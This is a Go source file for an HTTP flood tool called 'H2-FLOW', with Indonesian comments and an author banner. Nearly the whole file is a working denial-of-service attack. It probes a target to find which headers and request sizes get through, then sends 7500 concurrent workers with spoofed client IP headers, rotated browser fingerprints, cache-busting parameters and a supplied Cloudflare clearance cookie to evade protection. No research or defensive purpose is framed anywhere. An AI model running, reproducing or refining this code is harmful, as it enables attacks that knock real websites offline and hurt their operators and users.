// ================== H2-FLOW ==================
package main
import (
"bufio"
"context"
"crypto/tls"
"fmt"
"io"
"math/rand"
"net"
"net/http"
"net/http/cookiejar"
"net/url"
"os"
"os/signal"
"runtime"
"strconv"
"strings"
"sync"
"syscall"
"time"
)

// ================== WARNA ==================
const (
HAPUS = "\033[0m"
MERAH = "\033[31m"
IJO = "\033[32m"
PUTIH = "\033[37m"
CANDY = "\033[91m"
PUCAT = "\033[38;5;203m"
PUNYAMU = "\033[38;5;204m"
PUNYA_LU_PUCAT = "\033[38;5;218m"
MASA_DEPAN_NYA = "\033[97m"
Speed = 7500
to = 6 * time.Second
KEP = 30 * time.Second
)

// ================== PROF ==================
type BPF struct {
UA string
Accept string
Lang string
Encoding string
SecChUa string
SecChUaMov string
SecChUaPlat string
SecFetchSite string
SecFetchMode string
SecFetchDest string
Referer string
Origin string
DNT string
}

// ================== BROWSER ==================
var PFS = []BPF{
{
UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
Lang: "en-US,en;q=0.9",
Encoding: "gzip, deflate, br",
SecChUa: `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
SecChUaMov: "?0",
SecChUaPlat: "Windows",
SecFetchSite: "none",
SecFetchMode: "navigate",
SecFetchDest: "document",
Referer: "https://www.google.com/search?q=",
Origin: "https://www.google.com",
DNT: "",
},
{
UA: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
Lang: "en-US,en;q=0.9",
Encoding: "gzip, deflate, br",
SecChUa: `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
SecChUaMov: "?0",
SecChUaPlat: "macOS",
SecFetchSite: "none",
SecFetchMode: "navigate",
SecFetchDest: "document",
Referer: "https://www.google.com/search?q=",
Origin: "https://www.google.com",
DNT: "",
},
{
UA: "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
Lang: "en-US,en;q=0.9",
Encoding: "gzip, deflate, br",
SecChUa: `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
SecChUaMov: "?1",
SecChUaPlat: "Android",
SecFetchSite: "none",
SecFetchMode: "navigate",
SecFetchDest: "document",
Referer: "https://www.google.com/search?q=",
Origin: "https://www.google.com",
DNT: "",
},
{
UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
Lang: "en-US,en;q=0.9",
Encoding: "gzip, deflate, br",
SecChUa: "",
SecChUaMov: "",
SecChUaPlat: "",
SecFetchSite: "none",
SecFetchMode: "navigate",
SecFetchDest: "document",
Referer: "https://www.google.com/search?q=",
Origin: "",
DNT: "1",
},
{
UA: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
Lang: "en-US,en;q=0.9",
Encoding: "gzip, deflate, br",
SecChUa: "",
SecChUaMov: "",
SecChUaPlat: "",
SecFetchSite: "none",
SecFetchMode: "navigate",
SecFetchDest: "document",
Referer: "https://www.google.com/search?q=",
Origin: "",
DNT: "1",
},
{
UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
Lang: "en-US,en;q=0.9",
Encoding: "gzip, deflate, br",
SecChUa: `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
SecChUaMov: "?0",
SecChUaPlat: "Windows",
SecFetchSite: "none",
SecFetchMode: "navigate",
SecFetchDest: "document",
Referer: "https://www.bing.com/search?q=",
Origin: "https://www.bing.com",
DNT: "",
},
{
UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
Lang: "en-US,en;q=0.9",
Encoding: "gzip, deflate, br",
SecChUa: `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
SecChUaMov: "?0",
SecChUaPlat: "Windows",
SecFetchSite: "none",
SecFetchMode: "navigate",
SecFetchDest: "document",
Referer: "https://www.google.com/search?q=",
Origin: "https://www.google.com",
DNT: "",
},
{
UA: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
Lang: "en-US,en;q=0.9",
Encoding: "gzip, deflate, br",
SecChUa: "",
SecChUaMov: "",
SecChUaPlat: "",
SecFetchSite: "none",
SecFetchMode: "navigate",
SecFetchDest: "document",
Referer: "https://www.google.com/search?q=",
Origin: "",
DNT: "",
},
{
UA: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
Lang: "en-US,en;q=0.9",
Encoding: "gzip, deflate, br",
SecChUa: "",
SecChUaMov: "",
SecChUaPlat: "",
SecFetchSite: "none",
SecFetchMode: "navigate",
SecFetchDest: "document",
Referer: "https://www.google.com/search?q=",
Origin: "",
DNT: "",
},
}

var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
var REF = []string{
"https://www.google.com/search?q=",
"https://www.bing.com/search?q=",
"https://www.yahoo.com/search?p=",
"https://www.duckduckgo.com/?q=",
}
type CLI struct {
client *http.Client
ip string
}
func init() {
runtime.GOMAXPROCS(runtime.NumCPU())}
func RIP(rng *rand.Rand) string {
return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))}
func RST(rng *rand.Rand, length int) string {
const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
b := make([]byte, length)
for i := range b {
b[i] = chars[rng.Intn(len(chars))]}
return string(b)}
var CCK string
var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)

// ================== PROBE RACE ==================
type PRBC struct {
ID int
Client *http.Client
Proxy *url.URL
}
func PWRC(target string, size int, clients []PRBC, paramName string, headerName string, headerValue string) (bool, error) {
if len(clients) == 0 {
return false, fmt.Errorf("None")
}
resultChan := make(chan bool, 1)
ctx, cancel := context.WithCancel(context.Background())
defer cancel()
for _, pc := range clients {
go func(c PRBC) {
var err error
var resp *http.Response
testURL := target
if paramName != "" {
if strings.Contains(testURL, "?") {
testURL += "&" + paramName + "=" + strings.Repeat("x", size)
} else {
testURL += "?" + paramName + "=" + strings.Repeat("x", size)
}
}
req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
if err != nil {
return
}
if headerName != "" {
req.Header.Set(headerName, headerValue)
}
resp, err = c.Client.Do(req)
if err != nil {
return
}
defer resp.Body.Close()
select {
case resultChan <- true:
case <-ctx.Done():
}
}(pc)
}
select {
case <-resultChan:
return true, nil
case <-time.After(6 * time.Second):
return false, fmt.Errorf("timeout")
}
}

// ================== URL SIZE ==================
func PMP(target string, clients []PRBC) int {
sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
berhasil := 0
for _, size := range sizes {
ok, _ := PWRC(target, size, clients, "big", "", "")
if !ok {
return berhasil
}
berhasil = size
}
return berhasil
}

// ================== MAX HEAD ==================
func PMH(target string, clients []PRBC) int {
sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
berhasil := 0
for _, size := range sizes {
ok, _ := PWRC(target, size, clients, "", "X-Large-Data", strings.Repeat("x", size))
if !ok {
return berhasil
}
berhasil = size
}
return berhasil
}

// ================== HEAD BYPASS ==================
func PHR(target string, proxyIP string, clients []PRBC) map[string]bool {
parsedTarget, _ := url.Parse(target)
targetHost := parsedTarget.Hostname()
rng := rand.New(rand.NewSource(time.Now().UnixNano()))
headerTests := map[string]string{
"X-Original-URL": "/" + RST(rng, 8),
"X-Forwarded-Host": targetHost,
"X-Request-ID": strconv.FormatInt(rng.Int63(), 16),
"CDN-Loop": "cloudflare",
"CF-Connecting-IP": proxyIP,
"True-Client-IP": proxyIP,
}
result := make(map[string]bool)
for h, val := range headerTests {
ok, _ := PWRC(target, 1, clients, "", h, val)
result[h] = ok
}
return result
}

// ================== HSUPPORT ==================
func HSUPPORT(target string) string {
parsed, _ := url.Parse(target)
host := parsed.Hostname()
port := "443"
conn, err := tls.Dial("tcp", net.JoinHostPort(host, port), &tls.Config{
InsecureSkipVerify: true,
NextProtos: []string{"h2", "http/1.1"},
})
if err != nil {
return "unknown"
}
defer conn.Close()
proto := conn.ConnectionState().NegotiatedProtocol
if proto == "h2" {
return "H2"
} else if proto == "http/1.1" {
return "H1"
}
return "H3"
}

// ================== ORIGIN ==================
func ORIGIN(target string, clients []PRBC) []string {
parsed, _ := url.Parse(target)
host := parsed.Hostname()
candidates := []string{
"https://" + host,
"https://www.google.com",
"https://www.bing.com",
"https://www.yahoo.com",
"",
}
var valid []string
for _, origin := range candidates {
ok, _ := PWRC(target, 1, clients, "", "Origin", origin)
if ok {
valid = append(valid, origin)
}
}
if len(valid) == 0 {
valid = append(valid, "https://"+host)
}
return valid
}

// ================== UA TEST ==================
func UA_TEST(target string, clients []PRBC) []string {
testUAs := []string{
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
}
var valid []string
for _, ua := range testUAs {
ok, _ := PWRC(target, 1, clients, "", "User-Agent", ua)
if ok {
valid = append(valid, ua)
}
}
if len(valid) == 0 {
valid = append(valid, testUAs[0])
}
return valid
}

// ================== REFFERER ==================
func REFFERER(target string, clients []PRBC) []string {
parsed, _ := url.Parse(target)
host := parsed.Hostname()
testReferers := []string{
"https://" + host + "/",
"https://www.google.com/search?q=" + host,
"https://www.bing.com/search?q=" + host,
"https://www.yahoo.com/search?p=" + host,
"",
}
var valid []string
for _, ref := range testReferers {
ok, _ := PWRC(target, 1, clients, "", "Referer", ref)
if ok {
valid = append(valid, ref)
}
}
if len(valid) == 0 {
valid = append(valid, "https://"+host+"/")
}
return valid
}

// ================== PPHEAD ==================
func PPHEAD(target string, proxyIPs []string, clients []PRBC) []string {
testIPs := []string{"127.0.0.1", "192.168.1.1", "10.0.0.1", "8.8.8.8"}
for _, p := range proxyIPs {
if p != "" {
testIPs = append(testIPs, p)
}
}
var valid []string
for _, ip := range testIPs {
ok, _ := PWRC(target, 1, clients, "", "X-Forwarded-For", ip)
if ok {
valid = append(valid, ip)
}
}
if len(valid) == 0 {
valid = append(valid, "127.0.0.1")
}
return valid
}

// ================== HMETHOD ==================
func HMETHOD(target string, clients []PRBC) []string {
methods := []string{"GET", "POST", "OPTIONS"}
var valid []string
for _, method := range methods {
client := clients[0].Client
var req *http.Request
var err error
if method == "POST" {
req, err = http.NewRequest("POST", target, strings.NewReader(""))
req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
} else {
req, err = http.NewRequest(method, target, nil)
}
if err != nil {
continue
}
req.Header.Set("User-Agent", "Mozilla/5.0")
resp, err := client.Do(req)
if err != nil {
continue
}
resp.Body.Close()
if resp.StatusCode >= 200 && resp.StatusCode < 400 {
valid = append(valid, method)
}
}
if len(valid) == 0 {
valid = append(valid, "GET")
}
return valid
}

// ================== ENCOD ==================
func ENCOD(target string, clients []PRBC) []string {
encodings := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity"}
var valid []string
for _, enc := range encodings {
ok, _ := PWRC(target, 1, clients, "", "Accept-Encoding", enc)
if ok {
valid = append(valid, enc)
}
}
if len(valid) == 0 {
valid = append(valid, "gzip, deflate, br")
}
return valid
}

// ================== CACH ==================
func CACH(target string, clients []PRBC) []string {
controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
var valid []string
for _, cc := range controls {
ok, _ := PWRC(target, 1, clients, "", "Cache-Control", cc)
if ok {
valid = append(valid, cc)
}
}
if len(valid) == 0 {
valid = append(valid, "no-cache")
}
return valid
}

// ================== GABUNGKAN HASIL ==================
type PREST struct {
VOR []string
VUA []string
VRE []string
VPH []string
VME []string
VEN []string
VCC []string
}

// ================== ORIGIN ==================
type ORPL struct {
Origin string
Referer string
SecFetchSite string
}
func GPFO(origin string, host string) ORPL {
switch origin {
case "https://" + host:
return ORPL{
Origin: origin,
Referer: "https://" + host + "/",
SecFetchSite: "same-origin",
}
case "https://www.google.com":
return ORPL{
Origin: origin,
Referer: "https://www.google.com/search?q=" + host,
SecFetchSite: "cross-site",
}
case "https://www.bing.com":
return ORPL{
Origin: origin,
Referer: "https://www.bing.com/search?q=" + host,
SecFetchSite: "cross-site",
}
case "https://www.yahoo.com":
return ORPL{
Origin: origin,
Referer: "https://www.yahoo.com/search?p=" + host,
SecFetchSite: "cross-site",
}
default:
return ORPL{
Origin: "",
Referer: "",
SecFetchSite: "cross-site",
}
}
}

// ================== MAIN ==================
func main() {
if len(os.Args) < 2 {
fmt.Println("Cara pakai: H2-FLOW.go <target> <duration> <cookie>")
fmt.Println("Contoh: H2-FLOW.go https://target.com 60 \"cf_clearance=xxx\"")
os.Exit(1)
}
tgt := os.Args[1]
dur := 0
if len(os.Args) >= 3 {
if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
dur = d
}
}
if len(os.Args) >= 4 {
CCK = os.Args[3]
}
parsed, _ := url.Parse(tgt)
host := parsed.Hostname()
if strings.HasPrefix(host, "www.") {
host = host[4:]
}

// ================== BACA PROXY ==================
var PRX []*url.URL
file, err := os.Open("proxy.txt")
if err == nil {
defer file.Close()
scanner := bufio.NewScanner(file)
for scanner.Scan() {
line := strings.TrimSpace(scanner.Text())
if line == "" {
continue
}
if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
line = "http://" + line
}
if p, err := url.Parse(line); err == nil {
PRX = append(PRX, p)
}
}
}
if len(PRX) == 0 {
PRX = append(PRX, nil)
}
var ProxyX string
var proxyIPs []string
for _, p := range PRX {
if p != nil {
proxyIPs = append(proxyIPs, p.Hostname())
}
}
if len(proxyIPs) > 0 {
ProxyX = proxyIPs[0]
}

// ================== BUAT 3 PROBE CLIENT ==================
var PRBCS []PRBC
limit := 3
if len(PRX) < 3 {
limit = len(PRX)
}
for i := 0; i < limit && i < len(PRX); i++ {
p := PRX[i]
tr := &http.Transport{
Proxy: http.ProxyURL(p),
TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
MaxIdleConns: 10,
IdleConnTimeout: 30 * time.Second,
}
client := &http.Client{
Timeout: 5 * time.Second,
Transport: tr,
}
PRBCS = append(PRBCS, PRBC{
ID: i + 1,
Client: client,
Proxy: p,
})
}
if len(PRBCS) == 0 {
tr := &http.Transport{
TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
MaxIdleConns: 10,
IdleConnTimeout: 30 * time.Second,
}
client := &http.Client{
Timeout: 5 * time.Second,
Transport: tr,
}
PRBCS = append(PRBCS, PRBC{
ID: 1,
Client: client,
Proxy: nil,
})
}

// ================== BYPASS PARALEL ==================
fmt.Printf("%s\n▶ Proses Bypass!%s\n", IJO, HAPUS)

var wg sync.WaitGroup
wg.Add(10)

var MaxP, MaxHead int
var Supported map[string]bool
var HVERSI string
var VORI, VUAS, VREF, VIPS []string
var VMET, VENC, VCAC []string

go func() {
defer wg.Done()
MaxP = PMP(tgt, PRBCS)
}()
go func() {
defer wg.Done()
MaxHead = PMH(tgt, PRBCS)
}()
go func() {
defer wg.Done()
Supported = PHR(tgt, ProxyX, PRBCS)
}()
go func() {
defer wg.Done()
HVERSI = HSUPPORT(tgt)
}()
go func() {
defer wg.Done()
VORI = ORIGIN(tgt, PRBCS)
}()
go func() {
defer wg.Done()
VUAS = UA_TEST(tgt, PRBCS)
}()
go func() {
defer wg.Done()
VREF = REFFERER(tgt, PRBCS)
}()
go func() {
defer wg.Done()
VIPS = PPHEAD(tgt, proxyIPs, PRBCS)
}()
go func() {
defer wg.Done()
VMET = HMETHOD(tgt, PRBCS)
}()
go func() {
defer wg.Done()
VENC = ENCOD(tgt, PRBCS)
}()
go func() {
defer wg.Done()
VCAC = CACH(tgt, PRBCS)
}()

wg.Wait()

PRLT := PREST{
VOR: VORI,
VUA: VUAS,
VRE: VREF,
VPH: VIPS,
VME: VMET,
VEN: VENC,
VCC: VCAC,
}
_ = PRLT

// ================== LOGO ==================
fmt.Printf("%s", MASA_DEPAN_NYA)
fmt.Println("\n:::::::-.  :::::::::      .,~:::::    .:::.")
fmt.Printf("%s", PUNYA_LU_PUCAT)
fmt.Println(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.")
fmt.Printf("%s", PUNYAMU)
fmt.Println(" `[[     [[    .n[['    [[[          ''  ,['")
fmt.Printf("%s", PUCAT)
fmt.Println("  $$,    $$  ,$$P\" cccc $$$          .c$$P'")
fmt.Printf("%s", MERAH)
fmt.Println("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,")
fmt.Printf("%s", CANDY)
fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
fmt.Printf("%s", HAPUS)
fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)

printInfo := func(label, value, status string) {
if status != "" {
fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s %s[%s%s%s]\n",
IJO, HAPUS,
PUTIH, label, HAPUS,
MERAH, HAPUS,
PUTIH, value, HAPUS,
MERAH, IJO, status, MERAH)
} else {
fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s\n",
IJO, HAPUS,
PUTIH, label, HAPUS,
MERAH, HAPUS,
PUTIH, value, HAPUS)
}
}

printInfo("Author", "Diz Flyze Ofc              ", "True")
printInfo("Target", host, "")
printInfo("Port  ", "443                        ", "True")
printInfo("Method", "H2-FLOW                    ", "True")
printInfo("Proxy ", fmt.Sprintf("%d                        ", len(PRX)), "True")
printInfo("Worker", fmt.Sprintf("%d                       ", Speed), "True")
printInfo("HTTP  ", fmt.Sprintf("%-24s   ", HVERSI), "True")
if CCK != "" {
fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
IJO, HAPUS,
PUTIH, HAPUS,
MERAH, HAPUS,
MERAH, IJO, "True", MERAH)
} else {
fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
IJO, HAPUS,
PUTIH, HAPUS,
MERAH, HAPUS,
PUTIH, IJO, "None", PUTIH)
}
fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)

// ================== TIMER ==================
Start_Main := time.Now()
ctx, cancel := context.WithCancel(context.Background())
go func() {
ticker := time.NewTicker(1 * time.Second)
defer ticker.Stop()
for {
select {
case <-ctx.Done():
fmt.Printf("\r%*s\r", 80, "")
return
case <-ticker.C:
elapsed := int(time.Since(Start_Main).Seconds())
if elapsed > dur && dur > 0 {
elapsed = dur
}
fmt.Printf("\r%s〇%s %sTime  %s %s:%s %s%02d/%ds%s                    %s[%s%s%s]\033[K",
IJO, HAPUS,
PUTIH, HAPUS,
MERAH, HAPUS,
PUTIH, elapsed, dur, HAPUS,
MERAH, IJO, "True", MERAH)
}
}
}()
var wg2 sync.WaitGroup
if dur > 0 {
time.AfterFunc(time.Duration(dur)*time.Second, func() {
cancel()
})
}

// ================== H2-FLOW ==================
wcs := make([]CLI, len(PRX))
for i, ProxyY := range PRX {
tr := &http.Transport{
DialContext: (&net.Dialer{
Timeout: 4 * time.Second,
KeepAlive: KEP,
}).DialContext,
DisableKeepAlives: false,
DisableCompression: false,
MaxIdleConns: 10000,
MaxIdleConnsPerHost: 5000,
MaxConnsPerHost: 0,
IdleConnTimeout: KEP,
TLSClientConfig: &tls.Config{
InsecureSkipVerify: true,
MinVersion: tls.VersionTLS12,
MaxVersion: tls.VersionTLS13,
NextProtos: []string{"h2", "http/1.1"},
CipherSuites: []uint16{
tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
},
},
ForceAttemptHTTP2: true,
TLSHandshakeTimeout: 4 * time.Second,
ResponseHeaderTimeout: 4 * time.Second,
ExpectContinueTimeout: 0 * time.Second,
}
ip := ""
if ProxyY != nil {
tr.Proxy = http.ProxyURL(ProxyY)
ip = ProxyY.Hostname()
}
jar, _ := cookiejar.New(nil)
client := &http.Client{
Transport: tr,
Timeout: to,
Jar: jar,
}
wcs[i] = CLI{client: client, ip: ip}
}

// ================== WORKER ==================
for i := 0; i < Speed; i++ {
wg2.Add(1)
c := wcs[i%len(wcs)]
go func(cli CLI, workerID int) {
defer wg2.Done()
rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
for ctx.Err() == nil {
method := VMET[rng.Intn(len(VMET))]
ua := VUAS[rng.Intn(len(VUAS))]
ref := VREF[rng.Intn(len(VREF))]
enc := VENC[rng.Intn(len(VENC))]
cacheCtrl := VCAC[rng.Intn(len(VCAC))]
FORIP := VIPS[rng.Intn(len(VIPS))]
SLOR := VORI[rng.Intn(len(VORI))]
OPRF := GPFO(SLOR, host)
prof := PFS[rng.Intn(len(PFS))]
Target := tgt
param := CBP[rng.Intn(len(CBP))]
if strings.Contains(Target, "?") {
Target += "&" + param + "=" + strconv.FormatInt(rng.Int63(), 10)
} else {
Target += "?" + param + "=" + strconv.FormatInt(rng.Int63(), 10)
}
if MaxP > 0 && rng.Intn(3) == 0 {
size := MaxP/2 + rng.Intn(MaxP/2)
if size < 1 {
size = 64
}
Target += "&big=" + strings.Repeat("x", size)
}
if rng.Intn(10) == 0 {
Target += "&" + RST(rng, 8) + "=" + RST(rng, 12)
}
var req *http.Request
var body io.Reader
if method == "POST" {
body = strings.NewReader("")
} else {
body = nil
}
req, _ = http.NewRequest(method, Target, body)
if method == "POST" {
req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
}
req.Header.Set("User-Agent", ua)
req.Header.Set("Accept-Encoding", enc)
req.Header.Set("Cache-Control", cacheCtrl)
if OPRF.Origin != "" && OPRF.Referer != "" {
req.Header.Set("Referer", OPRF.Referer)
} else if ref != "" {
req.Header.Set("Referer", ref)
}
if OPRF.Origin != "" {
req.Header.Set("Origin", OPRF.Origin)
}
req.Header.Set("Sec-Fetch-Site", OPRF.SecFetchSite)
req.Header.Set("Accept", prof.Accept)
req.Header.Set("Accept-Language", prof.Lang)
req.Header.Set("Connection", "keep-alive")
req.Header.Set("Pragma", "no-cache")
req.Header.Set("Upgrade-Insecure-Requests", "1")
req.Header.Set("If-Modified-Since", ifModifiedSince)
req.Header.Set("X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16))
if prof.SecChUa != "" {
req.Header.Set("Sec-Ch-Ua", prof.SecChUa)
req.Header.Set("Sec-Ch-Ua-Mobile", prof.SecChUaMov)
req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)
}
req.Header.Set("Sec-Fetch-Mode", prof.SecFetchMode)
req.Header.Set("Sec-Fetch-Dest", prof.SecFetchDest)
if prof.DNT != "" {
req.Header.Set("DNT", prof.DNT)
}
if rng.Intn(3) == 0 {
req.Header.Set("TE", "trailers")
}
if rng.Intn(4) == 0 {
req.Header.Set("A-IM", "Feed")
}
if rng.Intn(4) == 0 {
req.Header.Set("Delta-Base", "12340001")
}
if rng.Intn(3) == 0 {
req.Header.Set("dnt", "1")
}
if rng.Intn(4) == 0 {
req.Header.Set("Access-Control-Request-Method", "GET")
}
if rng.Intn(5) == 0 {
req.Header.Set("source-ip", RST(rng, 5))
}
if rng.Intn(4) == 0 {
req.Header.Set("Data-Return", "false")
}
if Supported["X-Original-URL"] && rng.Intn(3) == 0 {
req.Header.Set("X-Original-URL", "/"+strconv.FormatInt(rng.Int63(), 16))
}
if Supported["X-Forwarded-Host"] && rng.Intn(3) == 0 {
req.Header.Set("X-Forwarded-Host", strconv.FormatInt(rng.Int63(), 16)+"t.me/ytdizflyze")
}
if Supported["X-Request-ID"] && rng.Intn(3) == 0 {
req.Header.Set("X-Request-ID", strconv.FormatInt(rng.Int63(), 16))
}
if Supported["CF-Connecting-IP"] && rng.Intn(5) == 0 {
req.Header.Set("CF-Connecting-IP", cli.ip)
}
if Supported["True-Client-IP"] && rng.Intn(5) == 0 {
req.Header.Set("True-Client-IP", cli.ip)
}
if Supported["CDN-Loop"] && rng.Intn(5) == 0 {
req.Header.Set("CDN-Loop", "cloudflare")
}
if rng.Intn(5) == 0 {
req.Header.Set("X-Real-IP", cli.ip)
}
if MaxHead > 0 && rng.Intn(2) == 0 {
size := MaxHead/2 + rng.Intn(MaxHead/2)
if size < 1 {
size = 512
}
req.Header.Set("X-Large-Data", strings.Repeat("x", size))
}
var cookies []string
if CCK != "" {
cookies = append(cookies, CCK)
}
for _, name := range COOKIES {
if rng.Intn(2) == 0 {
cookies = append(cookies, name+"="+strconv.FormatInt(rng.Int63(), 16))
}
}
if len(cookies) > 0 {
req.Header.Set("Cookie", strings.Join(cookies, "; "))
}
pid := cli.ip
if pid == "" {
pid = FORIP
}
req.Header.Set("X-Forwarded-For", pid)
req.Header.Set("X-Real-IP", pid)
resp, err := cli.client.Do(req)
if err == nil {
io.Copy(io.Discard, resp.Body)
resp.Body.Close()
}
}
}(c, i)
}

// ================== CTRL/TIME ==================
sig := make(chan os.Signal, 1)
signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
select {
case <-sig:
cancel()
case <-ctx.Done():
}
wg2.Wait()
fmt.Println()
}
